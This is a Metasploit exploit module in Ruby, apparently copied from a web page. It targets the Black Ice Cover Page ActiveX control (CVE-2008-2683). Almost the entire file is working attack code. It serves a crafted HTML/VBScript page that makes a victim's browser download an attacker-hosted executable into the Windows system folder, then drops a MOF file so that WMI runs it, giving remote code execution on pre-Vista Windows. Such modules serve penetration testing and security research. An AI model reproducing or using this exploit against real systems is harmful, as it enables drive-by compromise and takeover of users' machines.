# $Id: blackice_downloadimagefileurl.rb 12992 2011-06-21 02:51:39Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
    include Msf::Exploit::WbemExec
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({
        :os_name    => OperatingSystems::WINDOWS,
        :javascript => true,
        :rank       => NormalRanking,
        :vuln_test  => nil,
    })
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Black Ice Cover Page ActiveX Control Arbitrary File Download&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote attackers to place arbitrary files on a users file system
                by abusing the "DownloadImageFileURL" method in the Black Ice BIImgFrm.ocx ActiveX
                Control (BIImgFrm.ocx 12.0.0.0).  Code exeuction can be acheived by first uploading the
                payload to the remote machine, and then upload another mof file, which enables Windows
                Management Instrumentation service to execute the binary. Please note that this module
                currently only works for Windows before Vista.  Also, a similar issue is reported in
                BIDIB.ocx (10.9.3.0) within the Barcode SDK.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;shinnai&#039;,  # original discovery
                    &#039;mr_me&#039;,    # msf
                    &#039;sinn3r&#039;    # wbemexec tekniq
                ],
            &#039;Version&#039;        => &#039;$Revision: 12992 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2008-2683&#039;],
                    [ &#039;OSVDB&#039;, &#039;46007&#039;],
                    [ &#039;BID&#039;, &#039;29577&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/5750/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 2048,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    #Windows before Vista
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 05 2008&#039;))
    end
 
    def autofilter
        false
    end
 
    def check_dependencies
        use_zlib
    end
 
    def on_request_uri(cli, request)
 
        if request.uri.match(/\.EXE/)
            print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
            send_response(cli, @payload, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
            return
        elsif request.uri.match(/\.MOF/)
            return if @mof_name == nil or @payload_name == nil
            print_status("Generating mof...")
            mof = generate_mof(@mof_name, @payload_name)
            print_status("Sending MOF to #{cli.peerhost}:#{cli.peerport}...")
            send_response(cli, mof, {&#039;Content-Type&#039;=>&#039;application/octet-stream&#039;})
            return
        end
 
        url =  "http://"
        url += (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
        url += ":" + datastore[&#039;SRVPORT&#039;] + get_resource() + "/"
 
        #VBScript variables
        clsid                 = "79956462-F148-497F-B247-DF35A095F80B"
        method                = "DownloadImageFileURL"
        blackice              = rand_text_alpha(rand(100) + 1)           #BlackIce object ID
        @payload_name         = rand_text_alpha(rand(10) + 1) + ".EXE"   #Payload name
        payload_vbs_url_name  = rand_text_alpha(5)                       #Payload&#039;s vbs var name
        payload_vbs_lpath     = rand_text_alpha(6)                       #Payload&#039;s lpath var name
        @mof_name             = rand_text_alpha(rand(10) + 1) + ".MOF"   #MOF path on victim machine
        mof_vbs_url_name      = rand_text_alpha(5)                       #MOF&#039;s vbs var name
        mof_vbs_lpath         = rand_text_alpha(6)                       #MOF&#039;s lpath var name
        sub_name              = rand_text_alpha(rand(10) + 1)            #Subroutine name
 
        #Slow connection friendly: We will wait for 4 seconds before we try to execute our payload
        #This delay seems necessary before calling mof, otherwise we end up interrupting downloading
        #our payload
        content = <<-EOS
        <html>
        <object classid=&#039;clsid:#{clsid}&#039; id=&#039;#{blackice}&#039; ></object>
        <script language=&#039;vbscript&#039;>
        sub #{sub_name}
        #{mof_vbs_url_name} = "#{url}#{@mof_name}"
        #{mof_vbs_lpath} = "C:\\WINDOWS\\system32\\wbem\\mof\\#{@mof_name}"
        #{blackice}.#{method} #{mof_vbs_url_name}, #{mof_vbs_lpath}
        end sub
 
        #{payload_vbs_url_name} = "#{url}#{@payload_name}"
        #{payload_vbs_lpath} = "C:\\WINDOWS\\system32\\#{@payload_name}"
        #{blackice}.#{method} #{payload_vbs_url_name}, #{payload_vbs_lpath}
        setTimeout "#{sub_name}()", 4000
        </script>
        </html>
        EOS
 
        #Clear the extra tabs
        content = content.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
        send_response_html(cli, content)
        handler(cli)
 
    end
 
    def exploit
        @payload = generate_payload_exe
        super
    end
 
end



